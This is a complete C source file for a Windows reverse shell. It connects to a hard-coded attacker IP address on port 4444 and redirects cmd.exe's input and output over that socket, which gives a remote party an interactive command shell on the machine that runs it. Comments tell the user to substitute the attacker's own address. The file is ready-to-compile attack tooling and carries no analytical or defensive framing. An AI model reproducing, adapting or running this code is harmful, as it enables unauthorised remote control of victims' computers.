#include <winsock2.h>
#include <ws2tcpip.h>  // Required for InetPton()
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define REMOTE_IP L"192.168.21.20"  // Change this to your attacker's IP
#define REMOTE_PORT 4444           // Change this to your desired port

void reverse_shell() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = WSASocket(AF_INET, SOCK_STREAM, 0, NULL, 0, 0);

    // Configure remote connection
    server.sin_family = AF_INET;
    server.sin_port = htons(REMOTE_PORT);

    // Use InetPton() instead of inet_addr()
    if (InetPton(AF_INET, REMOTE_IP, &server.sin_addr) <= 0) {
        printf("Invalid IP address.\n");
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Connect to the attacker's machine
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Setup process I/O redirection
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;

    // Mutable buffer for process execution
    wchar_t cmd[] = L"cmd.exe";

    // Spawn a command shell
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(sock);
        WSACleanup();
        return;
    }

    // Wait for process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
    WSACleanup();
}

int main() {
    reverse_shell();
    return 0;
}
